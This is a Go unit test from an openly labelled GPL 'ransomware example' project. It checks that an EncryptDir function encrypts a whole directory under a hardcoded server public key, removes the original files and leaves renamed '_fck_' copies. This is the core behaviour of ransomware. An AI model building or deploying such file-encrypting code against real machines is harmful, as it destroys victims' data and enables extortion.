/*
Ransomware example in Golang
Copyright (C) 2017 Gustavo Henrique

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/
package cryptography_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/gustavohenrique/ransomware/cryptography"
)

func TestEncryptEntireDirectory(t *testing.T) {
	serverConfig := cryptography.ServerConfig{
		PubKey: cryptography.PubKey{
			X: "8e6859e0356e8ae0d6f97a7ea778baac6bc4260b3d6a05673df74b92eb5e07bf",
			Y: "89f9e0a014f0219c42ee172494ec5793f4f263cb59e9d08b309be57b99fc85a5",
		},
	}

	targetDir := filepath.Join(os.TempDir(), "test", "resources")
	decrypted := filepath.Join(targetDir, "notes.txt")
	encrypted := filepath.Join(targetDir, "_fck_notes.txt")

	assert.True(t, cryptography.Exists(decrypted))

	err := cryptography.EncryptDir(targetDir, serverConfig)
	assert.Nil(t, err)

	assert.False(t, cryptography.Exists(decrypted))
	assert.True(t, cryptography.Exists(encrypted))
}
